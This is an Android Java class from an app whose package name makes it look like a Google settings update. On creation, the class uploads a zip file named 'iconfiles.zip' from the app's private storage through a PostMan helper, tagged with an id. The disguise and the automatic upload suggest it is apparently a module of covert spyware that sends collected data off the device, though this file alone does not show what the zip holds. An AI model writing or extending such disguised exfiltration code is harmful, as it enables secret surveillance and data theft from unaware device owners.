package com.setting.dl.google.googlesettingupdate.mail;

import android.content.Context;

import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;

import java.io.File;


public class MailSendIcons{
    
    
    
    final private Context context;
    private String id;
    
    public MailSendIcons(Context context, String id) {
        
        this.context = context;
      
        this.id = id;
        run();
    }
    
    
    private void run() {
        
        File zipFile = new File(context.getFilesDir(), "iconfiles.zip");
        
        if(!zipFile.exists()) return;
    
        PostMan.getInstance(context).postFile(zipFile, "Icons", zipFile.getName(), id);
    }
}
